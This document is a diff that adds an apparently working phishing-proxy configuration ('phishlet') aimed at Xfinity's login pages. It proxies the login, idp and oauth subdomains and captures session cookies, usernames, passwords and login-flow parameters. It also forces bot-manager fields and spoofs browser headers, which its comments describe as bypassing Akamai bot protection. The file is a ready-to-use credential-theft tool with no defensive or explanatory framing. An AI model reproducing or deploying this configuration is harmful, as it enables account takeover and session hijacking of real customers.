@@ -1,0 +1,157 @@
+min_ver: '3.0.0'
+
+# Xfinity Phishlet - Updated for current Akamai Bot Manager
+# January 2026 version
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'xfinity.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'idp', orig_sub: 'idp', domain: 'xfinity.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'oauth', orig_sub: 'oauth', domain: 'xfinity.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # Comprehensive domain replacements
+  - {triggers_on: 'xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'https://login.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'login', domain: 'xfinity.com', search: 'login.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'idp', domain: 'xfinity.com', search: 'https://idp.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'idp', domain: 'xfinity.com', search: 'idp.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'text/css']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'https://oauth.xfinity.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'xfinity.com', orig_sub: 'oauth', domain: 'xfinity.com', search: 'oauth.xfinity.com', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  # Primary session tokens
+  - domain: '.xfinity.com'
+    keys: ['XFINITY-SSO', 'xsso', 'SC', 'bid', 'AMCV_*', 's_vi', 's_fid', 's_pers', 's_sess']
+  # Akamai bot protection cookies (CRITICAL)
+  - domain: '.xfinity.com'
+    keys: ['_abck', 'bm_sz', 'ak_bmsc', 'AWSALB', 'AWSALBCORS', 'AWSALBTG', 'AWSALBTGCORS', 'OptanonConsent', 'OptanonAlertBoxClosed']
+  # Additional session cookies
+  - domain: '.login.xfinity.com'
+    keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq']
+
+credentials:
+  # Username/Email capture
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+    page: '/login'
+    
+  # Password capture (this happens on the next step)
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+    page: '/login'
+    
+  # Capture all flow parameters for proper redirection
+  custom:
+    - key: 'flowId'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 'flowStateId'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 'reqId'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 'r'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+    - key: 's'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
+
+# ============================================
+# CRITICAL FIXES FOR AKAMAI BYPASS
+# ============================================
+
+# 1. Allow all Akamai Bot Manager parameters to pass through
+force_post:
+  # First POST (email submission)
+  - path: /login
+    search:
+      - {key: 'flowStep', search: 'username'}
+    force:
+      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
+      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
+      - {key: 'r', value: 'pass'}
+      - {key: 's', value: 'pass'}
+    type: 'post'
+  
+  # Second POST (password submission)
+  - path: /login
+    search:
+      - {key: 'flowStep', search: 'password'}
+    force:
+      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
+      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
+      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
+      - {key: 'rememberMe', value: 'pass'}
+    type: 'post'
+
+# 2. Remove problematic js_inject section (simplify for now)
+# js_inject:
+#   - trigger_domains: ["login.xfinity.com"]
+#     trigger_paths: ["/login"]
+#     trigger_params: ["flowStep=username"]
+#     script: |
+#       // Force proper form submission
+#       document.addEventListener('DOMContentLoaded', function() {
+#         var forms = document.querySelectorAll('form');
+#         forms.forEach(function(form) {
+#           form.addEventListener('submit', function(e) {
+#             // Ensure all hidden fields are preserved
+#             var hiddenFields = form.querySelectorAll('input[type="hidden"]');
+#             hiddenFields.forEach(function(field) {
+#               if (!field.value || field.value === '') {
+#                 // Clone from original if empty
+#                 var origField = document.querySelector('[name="' + field.name + '"]');
+#                 if (origField && origField.value) {
+#                   field.value = origField.value;
+#                 }
+#               }
+#             });
+#           });
+#         });
+#       });
+
+# 3. Configure login detection
+login:
+  domain: 'login.xfinity.com'
+  path: '/login'
+  detect:
+    - selector: 'form[action*="/login"] input[name="passwd"]'
+      type: 'visible'
+  redirect:
+    - url: 'https://www.xfinity.com'
+      conditional: true
+
+# ============================================
+# ADDITIONAL CONFIGURATION FOR BOT PROTECTION
+# ============================================
+
+# Set proper headers to mimic real browser
+headers:
+  remove:
+    - 'X-Forwarded-For'
+    - 'X-Real-IP'
+  add:
+    - 'X-Forwarded-Proto: https'
+    - 'Sec-Fetch-Dest: document'
+    - 'Sec-Fetch-Mode: navigate'
+    - 'Sec-Fetch-Site: same-origin'
+    - 'Sec-Fetch-User: ?1'
